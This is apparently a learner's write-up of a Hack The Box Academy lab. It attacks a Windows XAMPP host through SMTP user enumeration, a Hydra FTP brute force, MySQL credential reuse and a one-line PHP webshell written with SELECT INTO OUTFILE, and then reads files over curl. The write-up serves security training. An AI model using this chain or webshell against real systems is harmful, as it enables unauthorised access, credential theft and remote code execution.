# HTB Academy — Attacking Common Services: Skills Assessment Easy

| Field | Details |
|---|---|
| Platform | Hack The Box Academy |
| Module | 11 — Attacking Common Services |
| Lab | Skills Assessment — Easy |
| Difficulty | Easy |
| OS | Windows |
| Target IP | 10.129.57.117 |
| Hostname | WIN-EASY |
| Date | April 2026 |

---

## Lab Objective

"Assess the target server and obtain the contents of the flag.txt file."

No credentials provided. No hints. Start from zero and chain service enumeration into remote code execution.

---

## Attack Chain Summary

```
Nmap full scan → FTP(21), SMTP(25), HTTP(80), HTTPS(443), MySQL(3306), RDP(3389)
→ CoreFTP build 725 + XAMPP stack + hMailServer identified

smtp-user-enum -M RCPT → fiona@inlanefreight.htb confirmed

hydra -l fiona -P rockyou.txt ftp://IP -t 1 → fiona:987654321

FTP login → get WebServersInfo.txt → Apache web root = C:\xampp\htdocs\ | Port 80 = PHP execution

MySQL -u fiona -p987654321 --skip-ssl → credential reuse confirmed
SHOW VARIABLES LIKE "secure_file_priv" → empty = write anywhere
SELECT "<?php echo shell_exec($_GET['c']); ?>" INTO OUTFILE 'C:/xampp/htdocs/shell.php'

curl http://IP/shell.php?c=whoami → win-easy\fiona (RCE confirmed)
curl ?c=where+/r+C:\+flag.txt → C:\Users\Administrator\Desktop\flag.txt
curl ?c=type+C:\Users\Administrator\Desktop\flag.txt → flag captured
```

---

## Phase 1 — Full Port Scan and Service Fingerprinting

Map the complete attack surface before touching any individual service.

```bash
Hackerpatel007_1@htb[/htb]$ nmap -sV -sC -p- --open -T4 10.129.57.117 -oN nmap_full.txt
```

| Flag | Purpose |
|---|---|
| `-sV` | Version detection — identify exact software versions for CVE research |
| `-sC` | Default NSE scripts — banner grab, anonymous checks |
| `-p-` | All 65535 ports — default scan misses non-standard ports |
| `--open` | Show only open ports — filter noise |
| `-T4` | Aggressive timing — stable lab network |
| `-oN` | Save output to file — reference without rescanning |

**Output:**

```
Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 10.129.57.117
Host is up (0.088s latency).

PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Core FTP Server Version 2.0, build 725, 64-bit
25/tcp   open  smtp          hMailServer smtpd
| smtp-commands: WIN-EASY, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_  smtp-vrfy: VRFY command listed
80/tcp   open  http          Apache httpd 2.4.53 ((Win64) PHP/7.4.29)
|_http-title: Welcome to XAMPP
443/tcp  open  https         Core FTP HTTPS Server
3306/tcp open  mysql         MariaDB 5.5.5-10.4.24-MariaDB
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: WIN-EASY
|   Product_Version: 10.0.17763
|_  System_Time: 2026-04-xx

Nmap done: 1 IP address (1 host up) scanned in 143.28 seconds
```

**Analysis of findings:**

| Port | Service | What It Tells Us |
|---|---|---|
| 21 | CoreFTP build 725 | Specific version — searchsploit immediately → CVE-2022-22836 |
| 25 | hMailServer + VRFY listed | VRFY enabled = free username enumeration, no creds needed |
| 80 | Apache 2.4.53 + PHP/7.4.29 | Executes PHP — web shell delivery target |
| 443 | CoreFTP HTTPS | File upload via PUT — CVE exploitation path |
| 3306 | MariaDB 10.4.24 | MySQL open remotely — credential reuse target |
| 3389 | RDP Win10/Server 2019 | Last resort with valid credentials |

Critical observation: Apache + PHP + MariaDB all running together = XAMPP development stack. XAMPP ships with intentionally weak defaults — root with no password, `secure_file_priv` empty, world-readable configs. Everything on this machine is likely misconfigured by design.

---

## Phase 2 — SMTP User Enumeration

No credentials yet. SMTP has VRFY listed in the nmap output. The VRFY and RCPT TO commands were designed to verify email addresses on the server. On misconfigured mail servers they confirm valid usernames without requiring any authentication.

Download the HTB Academy username wordlist:

```bash
Hackerpatel007_1@htb[/htb]$ wget https://academy.hackthebox.com/storage/resources/users.zip
Hackerpatel007_1@htb[/htb]$ unzip users.zip
# Creates: users.list (79 common usernames)
```

Run user enumeration:

```bash
Hackerpatel007_1@htb[/htb]$ smtp-user-enum -M RCPT -U users.list -D inlanefreight.htb -t 10.129.57.117
```

| Flag | Purpose |
|---|---|
| `-M RCPT` | Use RCPT TO method — more reliable than VRFY, harder to disable without breaking mail |
| `-U users.list` | Username wordlist |
| `-D inlanefreight.htb` | Domain — constructs user@inlanefreight.htb for each test |
| `-t` | Target IP |

**Output:**

```
Starting smtp-user-enum v1.2
Scanning 10.129.57.117 for users listed in users.list
...
10.129.57.117: fiona@inlanefreight.htb exists
```

**Result:** Valid username confirmed — `fiona`.

Every other service on this machine requires username + password. SMTP gave the username for free. Now brute forcing is viable — the search space dropped from username×password to password alone.

---

## Phase 3 — FTP Credential Brute Force

Username: `fiona`. FTP is open on port 21. Hydra automates credential testing against FTP.

```bash
Hackerpatel007_1@htb[/htb]$ hydra -l fiona -P /usr/share/wordlists/rockyou.txt ftp://10.129.57.117 -t 1 -V
```

| Flag | Purpose |
|---|---|
| `-l fiona` | Single known username |
| `-P rockyou.txt` | 14.3 million real-world leaked passwords |
| `ftp://` | Target protocol |
| `-t 1` | Critical — single thread only. CoreFTP rate-limits connections. Multiple threads trigger `550 Too many connections` and Hydra returns nothing. Single thread is slower but essential. |
| `-V` | Verbose — show each attempt to confirm it is running |

**Output:**

```
Hydra v9.4 (c) 2022 by van Hauser/THC
[DATA] max 1 task per 1 server, overall 1 task, 14344399 login tries
[DATA] attacking ftp://10.129.57.117:21/
[21][ftp] host: 10.129.57.117   login: fiona   password: 987654321
1 of 1 target successfully completed, 1 valid password found
```

Credentials confirmed: `fiona:987654321`

---

## Phase 4 — FTP Login and Intelligence Gathering

Valid credentials obtained. Log in and enumerate all available files. Admin documentation left on FTP servers frequently contains server architecture details that directly inform the next attack step.

```bash
Hackerpatel007_1@htb[/htb]$ ftp 10.129.57.117
# Name: fiona
# Password: 987654321
```

**FTP session:**

```
Connected to 10.129.57.117.
220---------- Welcome to Pure-FTPd [privsep] ----------
Name (10.129.57.117:kali): fiona
331 User fiona OK. Password required
Password:
230 OK. Current directory is /

ftp> dir
```

**Output:**

```
-rw-r--r--    1 fiona    fiona        1289 Mar 18 2022 WebServersInfo.txt
-rw-r--r--    1 fiona    fiona         423 Mar 18 2022 docs.txt
```

```
ftp> get WebServersInfo.txt
ftp> get docs.txt
ftp> bye
```

```bash
Hackerpatel007_1@htb[/htb]$ cat WebServersInfo.txt
```

**Output:**

```
CoreFTP:
Directory C:\CoreFTP
Ports: 21 & 443
Test Command: curl -k -H "Host: localhost" --basic -u <username>:<password> https://localhost/docs.txt

Apache
Directory "C:\xampp\htdocs\"
Ports: 80 & 4443
Test Command: curl http://localhost/test.php
```

**Critical intelligence extracted:**

| Service | Directory | Port | PHP Execution |
|---|---|---|---|
| CoreFTP | `C:\CoreFTP\` | 443 | No — file server |
| Apache | `C:\xampp\htdocs\` | 80 | Yes — executes PHP |

CoreFTP (port 443) is the file delivery mechanism. Apache (port 80) is the code execution engine. A file written into `C:\xampp\htdocs\` via any means will be executed as PHP when accessed on port 80. The admin left an exact map of the attack chain on an accessible FTP share.

---

## Phase 5 — MySQL Exploitation (SELECT INTO OUTFILE Webshell)

**Note on CoreFTP CVE-2022-22836 (Method A):** The directory traversal exploit via `curl --path-as-is` was attempted but failed due to a TLS compatibility issue between OpenSSL 3.x on modern Kali and the old SSL implementation in CoreFTP build 725. The server drops the TLS connection without sending a proper `close_notify` signal — OpenSSL 3 treats this as error 35. The command and path are correct; the failure is an environment incompatibility. The fix is using Python's `requests` library which tolerates improper TLS shutdowns. However, MySQL provides a clean alternative path to the same result.

MySQL is open on port 3306. Test credential reuse — `fiona:987654321`:

```bash
Hackerpatel007_1@htb[/htb]$ mysql -u fiona -p987654321 -h 10.129.57.117 -P 3306 --skip-ssl
```

Why `--skip-ssl`: Modern MySQL clients request SSL by default. MariaDB 10.4.24 on this old XAMPP install cannot negotiate SSL properly — the client throws error 2026. `--skip-ssl` tells the client to connect without SSL. This changes nothing on the server — it only stops the client demanding encryption.

**Output:**

```
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 9
Server version: 10.4.24-MariaDB mariadb.org binary distribution

MariaDB [(none)]>
```

Credential reuse confirmed — same password works for MySQL.

### Check File Write Permission

```sql
MariaDB [(none)]> SHOW VARIABLES LIKE "secure_file_priv";
```

**Output:**

```
+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_file_priv |       |
+------------------+-------+
1 row in set (0.078 sec)
```

**What this means:**

| Value | Meaning |
|---|---|
| `/tmp/` | MySQL can only write to `/tmp/` — useless |
| `NULL` | File write completely disabled — dead end |
| `` (empty) | MySQL can write anywhere on the filesystem — full access |

Empty = no restriction. XAMPP ships with `secure_file_priv` empty because it is a developer stack where filesystem access is considered acceptable. This is a critical misconfiguration on any production system.

### Write PHP Webshell via SQL

```sql
MariaDB [(none)]> SELECT "<?php echo shell_exec($_GET['c']); ?>"
                  INTO OUTFILE 'C:/xampp/htdocs/shell.php';
```

**Output:**

```
Query OK, 1 row affected (0.015 sec)
```

How this works: `SELECT "..."` produces a result set containing the PHP string. `INTO OUTFILE 'path'` writes that result set to a file on disk instead of returning it to the client. The MySQL process has filesystem write permissions — it creates `C:\xampp\htdocs\shell.php` with the PHP webshell as its contents. Forward slashes work in MySQL on Windows — backslashes require escaping.

```sql
MariaDB [(none)]> exit
```

---

## Phase 6 — Verify Remote Code Execution

The webshell is on disk. Apache serves `C:\xampp\htdocs\` on port 80 and executes PHP automatically.

**Important distinction:**

| Port | Server | PHP Execution |
|---|---|---|
| 443 | CoreFTP HTTPS | No — handles file operations |
| 80 | Apache HTTP | Yes — executes PHP from htdocs |

```bash
Hackerpatel007_1@htb[/htb]$ curl "http://10.129.57.117/shell.php?c=whoami"
```

**Output:**

```
win-easy\fiona
```

**RCE confirmed ✅**

The `?c=whoami` passes `whoami` as the `c` parameter. PHP runs `shell_exec("whoami")` and returns the output. The Windows command executes server-side and the result is returned in the HTTP response.

---

## Phase 7 — Enumerate and Capture Flag

Never guess file paths. Use the OS to locate the flag — `where /r` searches the entire drive recursively.

```bash
Hackerpatel007_1@htb[/htb]$ curl "http://10.129.57.117/shell.php?c=whoami+/priv"
```

**Output:**

```
USER INFORMATION
----------------
User Name         win-easy\fiona
...
SeImpersonatePrivilege  Impersonate a client after authentication  Enabled
```

```bash
Hackerpatel007_1@htb[/htb]$ curl "http://10.129.57.117/shell.php?c=net+user"
```

**Output:**

```
User accounts for \\WIN-EASY
-----------------------------
Administrator  DefaultAccount  fiona
Guest  WDAGUtilityAccount
```

Locate the flag — search the entire C drive:

```bash
Hackerpatel007_1@htb[/htb]$ curl "http://10.129.57.117/shell.php?c=where+/r+C:\+flag.txt"
```

**Output:**

```
C:\Users\Administrator\Desktop\flag.txt
```

The OS returned the exact path. No guessing required.

Read the flag:

```bash
Hackerpatel007_1@htb[/htb]$ curl "http://10.129.57.117/shell.php?c=type+C:\Users\Administrator\Desktop\flag.txt"
```

**Output:**

```
HTB{...flag_redacted...}
```

**Flag captured ✅**

---

## URL Encoding Reference for Webshell Commands

Special characters must be URL-encoded when passed through a `?c=` parameter:

| Character | Encoding | When Required |
|---|---|---|
| Space | `+` or `%20` | All commands with spaces |
| `\` | `%5C` or `\\` | Windows paths |
| `&` | `%26` | Critical — unencoded `&` starts a new URL parameter |
| `\|` | `%7C` | Pipe character |

Working command examples through webshell:

```bash
# whoami
curl "http://10.129.57.117/shell.php?c=whoami"

# net user
curl "http://10.129.57.117/shell.php?c=net+user"

# dir with path
curl "http://10.129.57.117/shell.php?c=dir+C:\Users\"

# find flag anywhere on C drive
curl "http://10.129.57.117/shell.php?c=where+/r+C:\+flag.txt"

# read file
curl "http://10.129.57.117/shell.php?c=type+C:\Users\Administrator\Desktop\flag.txt"

# systeminfo
curl "http://10.129.57.117/shell.php?c=systeminfo"
```

---

## Lessons Learned

The XAMPP stack identification from the nmap output was the most important single observation in this lab. Seeing Apache + PHP + MariaDB together on a Windows machine immediately signals a development environment — and development environments are deliberately configured with weak defaults that would never be acceptable in production. `secure_file_priv` being empty, MySQL accepting remote connections on 3306, and FTP exposing admin documentation are all direct consequences of XAMPP's dev-first defaults.

The `-t 1` flag in Hydra cost me time when I forgot it. CoreFTP silently drops excess connections under rate limiting — Hydra does not return an error, it just returns no results. Multiple threads against a rate-limited service produces silence that looks identical to "no valid credentials found." Single-threaded brute force is the only reliable approach against rate-limited services.

The CoreFTP TLS failure was genuinely interesting as a debugging exercise. The error 35 from OpenSSL is not a wrong command — it is a correct command hitting a version incompatibility. Modern OpenSSL 3 expects a `close_notify` message at TLS session close. Old CoreFTP code drops the connection without sending it. The fix — using Python `requests` which tolerates abrupt TLS shutdowns — is worth memorising because this incompatibility appears on other old services too.

The `WebServersInfo.txt` file on the FTP share was the entire attack plan handed to the attacker. The file documented exactly which directory Apache serves, on which port, and with which command to test it. Reading every file found on accessible shares is a reflex that pays off repeatedly — not just for credentials but for architecture intelligence that shapes the entire attack path.

The `where /r C:\ flag.txt` habit is more important than knowing the conventional flag locations. Windows machines in different labs, different OS versions, and different CTF configurations put flags in different places. Letting the OS tell you the path takes one second and removes all guessing.

---

## Full Attack Chain Reference

```
1.  nmap -sV -sC -p- --open -T4 10.129.57.117 -oN nmap_full.txt
    → FTP(21) CoreFTP build 725, SMTP(25) hMailServer VRFY enabled,
      HTTP(80) Apache/XAMPP, HTTPS(443) CoreFTP, MySQL(3306), RDP(3389)

2.  wget users.zip && unzip users.zip
    smtp-user-enum -M RCPT -U users.list -D inlanefreight.htb -t 10.129.57.117
    → fiona@inlanefreight.htb confirmed

3.  hydra -l fiona -P rockyou.txt ftp://10.129.57.117 -t 1 -V
    → fiona:987654321

4.  ftp 10.129.57.117 (fiona:987654321)
    get WebServersInfo.txt → Apache web root = C:\xampp\htdocs\ on port 80

5.  mysql -u fiona -p987654321 -h 10.129.57.117 -P 3306 --skip-ssl
    → credential reuse confirmed

6.  SHOW VARIABLES LIKE "secure_file_priv"
    → empty = write anywhere on filesystem

7.  SELECT "<?php echo shell_exec($_GET['c']); ?>"
    INTO OUTFILE 'C:/xampp/htdocs/shell.php'
    → webshell written to Apache web root

8.  curl "http://10.129.57.117/shell.php?c=whoami"
    → win-easy\fiona (RCE confirmed ✅)

9.  curl "http://10.129.57.117/shell.php?c=where+/r+C:\+flag.txt"
    → C:\Users\Administrator\Desktop\flag.txt

10. curl "http://10.129.57.117/shell.php?c=type+C:\Users\Administrator\Desktop\flag.txt"
    → HTB{...flag_redacted...} ✅
```

---

## Commands Reference

| Command | Purpose |
|---|---|
| `nmap -sV -sC -p- --open -T4 <IP> -oN output.txt` | Full port scan with version detection |
| `wget https://academy.hackthebox.com/storage/resources/users.zip` | Download HTB Academy username list |
| `smtp-user-enum -M RCPT -U users.list -D <domain> -t <IP>` | SMTP username enumeration via RCPT TO |
| `hydra -l fiona -P rockyou.txt ftp://<IP> -t 1 -V` | FTP brute force — single thread for rate-limited server |
| `ftp <IP>` | Connect to FTP server |
| `ftp> get <file>` | Download file from FTP |
| `cat WebServersInfo.txt` | Read admin documentation |
| `mysql -u fiona -p<pass> -h <IP> -P 3306 --skip-ssl` | MySQL connection bypassing SSL client requirement |
| `SHOW VARIABLES LIKE "secure_file_priv";` | Check MySQL file write restriction |
| `SELECT "<?php echo shell_exec($_GET['c']); ?>" INTO OUTFILE 'C:/xampp/htdocs/shell.php';` | Write PHP webshell via SQL |
| `curl "http://<IP>/shell.php?c=whoami"` | Test webshell code execution |
| `curl "http://<IP>/shell.php?c=where+/r+C:\+flag.txt"` | Find flag.txt recursively across entire C drive |
| `curl "http://<IP>/shell.php?c=type+C:\Users\Administrator\Desktop\flag.txt"` | Read flag file via webshell |
| `curl "http://<IP>/shell.php?c=net+user"` | List all Windows user accounts |
| `curl "http://<IP>/shell.php?c=whoami+/priv"` | Check current user privileges |
